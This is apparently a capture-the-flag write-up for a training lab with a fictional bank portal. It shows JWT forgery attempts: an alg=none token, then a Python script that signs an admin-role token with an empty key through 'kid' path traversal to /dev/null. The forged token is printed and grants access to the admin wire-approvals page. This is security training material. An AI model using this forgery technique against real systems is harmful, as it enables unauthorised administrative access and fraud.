---

Name: Stillwater Co-op Bank
Difficulty: Easy
URL: https://dashboard.webverselabs-pro.com/learning-paths/junior-web-hacker/03/safe-deposit
Description: Stillwater Co-op Bank has served its community since 1958, four branches across two counties, twelve thousand members, share-draft accounts and small consumer loans only. The online portal was built one summer by the treasurer's nephew and bolted onto the back-office wire-approvals queue a few years later when remote staff outgrew the paper log. The board's compliance review last quarter flagged the whole stack as "long overdue for outside eyes." 

---

I've created an account and received this token
```text
eyJhbGciOiJIUzI1NiIsImtpZCI6IjIwMjQtcTQucGVtIiwidHlwIjoiSldUIn0.eyJzdWIiOiJib2JAZ21haWwuY29tIiwicm9sZSI6Im1lbWJlciIsIm1lbWJlcl9ubyI6IjkxMDAwLTgwMDAiLCJpYXQiOjE3ODcwNzY4NzgsImV4cCI6MTc4NzEwNTY3OH0._8gCl8FtQl7ejHL-U0crgX8ozjipZxalpWLfjt8GZ98
```

```json
{
  "alg": "HS256",
  "kid": "2024-q4.pem",
  "typ": "JWT"
}
```

```json
{
  "sub": "bob@gmail.com",
  "role": "member",
  "member_no": "91000-8000",
  "iat": 1787076878,
  "exp": 1787105678
}
```

I've tried forging a new JWT token with alg=none and the admin role, but it was not accepted
```
eyJhbGciOiJub25lIiwia2lkIjoiMjAyNC1xNC5wZW0iLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiJib2JAZ21haWwuY29tIiwicm9sZSI6ImFkbWluIiwibWVtYmVyX25vIjoiOTEwMDAtODAwMCIsImlhdCI6MTc4NzA3Njg3OCwiZXhwIjoxNzg3MTA1Njc4fQ.
```

Maybe we could trick the server into using a different key, instead of `2024-q4.pem`, or find its value


I've read [here](https://pentesterlab.com/blog/jwt-vulnerabilities-attacks-guide) about:
- Path Traversal for the kid: "kid": "../../../../dev/null", so it will be null

Since reading from /dev/null will return an empty string, an attacker can forge a token and sign it with an empty string. 

But jwt.io won't let me sign it with a null string, so I have used a python script
```python
import base64
import hashlib
import hmac
import json

def b64(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=')

header = {
    "alg": "HS256",
    "kid": "../../../../../../dev/null",
    "typ": "JWT"
}

payload = {
    "sub": "bob@gmail.com",
    "role": "admin",
    "member_no": "91000-8000",
    "iat": 1787076878,
    "exp": 1787105678
}

header_b64 = b64(json.dumps(header, separators=(",", ":")).encode())
payload_b64 = b64(json.dumps(payload, separators=(",", ":")).encode())

message = header_b64 + b"." + payload_b64

signature = hmac.new(
    b"",
    message,
    hashlib.sha256
).digest()

token = message + b"." + b64(signature)

print(token.decode())
```

```bash
eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uL2Rldi9udWxsIiwidHlwIjoiSldUIn0.eyJzdWIiOiJib2JAZ21haWwuY29tIiwicm9sZSI6ImFkbWluIiwibWVtYmVyX25vIjoiOTEwMDAtODAwMCIsImlhdCI6MTc4NzA3Njg3OCwiZXhwIjoxNzg3MTA1Njc4fQ.9JOWZy0uxXpK4qGdDvtGnlV-TSbdw8EFUVZpjT9j_3c
```

We now have access to /admin/wire-approvals, and can read the flag
